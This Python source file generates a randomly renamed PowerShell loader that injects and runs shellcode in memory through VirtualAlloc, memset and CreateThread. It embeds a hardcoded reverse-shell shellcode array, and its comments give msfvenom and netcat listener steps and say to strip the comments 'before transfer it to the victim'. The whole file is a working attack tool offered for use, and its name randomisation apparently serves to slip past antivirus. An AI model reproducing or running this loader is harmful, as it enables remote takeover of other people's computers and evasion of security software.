import random
import string

def random_variable_name(length=6):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))

def generate_powershell_script():
    # Randomize variable names
    var_sc = random_variable_name()
    var_size = random_variable_name()
    var_winFunc = random_variable_name()
    var_i = random_variable_name()
    var_x = random_variable_name()  # Define var_x

    # Randomize namespace and type name
    namespace_name = random_variable_name()
    type_name = random_variable_name()
    code =random_variable_name()

    # Fixed DllImport sections
    dll_imports = '''
    
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);'''

    # PowerShell script with fixed DllImports and randomized variables
    script = f'''
#####################################################################################################
#                                                                                                   #
# The script generates a PowerShell payload for injecting and executing shellcode in memory         #
#                                                                                                   #
#####################################################################################################
# Usage instructions:                                                                               #
# 0. IMPORTANT: Remove this comments before transfer it to the victim !!!                           #    
# 1. Generate shellcode using the following command:                                                #
#    msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=<YOUR_PORT> -f powershell -v sc    #
# 2. Replace ${var_sc} with the output from the above command.                                        #
# 3. Save this script to a file with a random name and .ps1 extension.                              #
# 4. Launch your listener                                                                           #
#    nc -nlvp <YOUR_PORT>                                                                           #
# 5. Execute the saved PowerShell script to run the payload using PowerShell 32bit                  #
#####################################################################################################

${code} = '{dll_imports}';
    
${var_winFunc} = Add-Type -memberDefinition ${code} -Name "{type_name}" -Namespace {namespace_name} -PassThru;

[Byte[]];
[Byte[]] ${var_sc} = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28,0xf,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,0x1,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x1,0xd1,0x51,0x8b,0x59,0x20,0x1,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xff,0xac,0xc1,0xcf,0xd,0x1,0xc7,0x38,0xe0,0x75,0xf6,0x3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c,0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x0,0x0,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x7,0xff,0xd5,0xb8,0x90,0x1,0x0,0x0,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x0,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0xf,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x5,0x68,0xc0,0xa8,0x2d,0xdd,0x68,0x2,0x0,0x1,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0xc,0xff,0x4e,0x8,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x68,0x63,0x6d,0x64,0x0,0x89,0xe3,0x57,0x57,0x57,0x31,0xf6,0x6a,0x12,0x59,0x56,0xe2,0xfd,0x66,0xc7,0x44,0x24,0x3c,0x1,0x1,0x8d,0x44,0x24,0x10,0xc6,0x0,0x44,0x54,0x50,0x56,0x56,0x56,0x46,0x56,0x4e,0x56,0x56,0x53,0x56,0x68,0x79,0xcc,0x3f,0x86,0xff,0xd5,0x89,0xe0,0x4e,0x56,0x46,0xff,0x30,0x68,0x8,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x0,0x53,0xff,0xd5;

${var_size} = 0x1000;

if (${var_sc}.Length -gt 0x1000) {{${var_size} = ${var_sc}.Length}};

${var_x} = ${var_winFunc}::VirtualAlloc(0,${var_size},0x3000,0x40);

for (${var_i}=0;${var_i} -le (${var_sc}.Length-1);${var_i}++) {{${var_winFunc}::memset([IntPtr](${var_x}.ToInt32()+${var_i}), ${var_sc}[${var_i}], 1)}};

${var_winFunc}::CreateThread(0,0,${var_x},0,0,0);for (;;) {{ Start-sleep 60 }};

#####################################################################################################

'''

    return script

# Generate PowerShell script
powershell_script = generate_powershell_script()
print(powershell_script)

# Write the script to a file with a random name and .ps1 extension
filename = random_variable_name() + '.ps1'
with open(filename, 'w') as f:
    f.write(powershell_script)

print(f"PowerShell script saved to '{filename}'")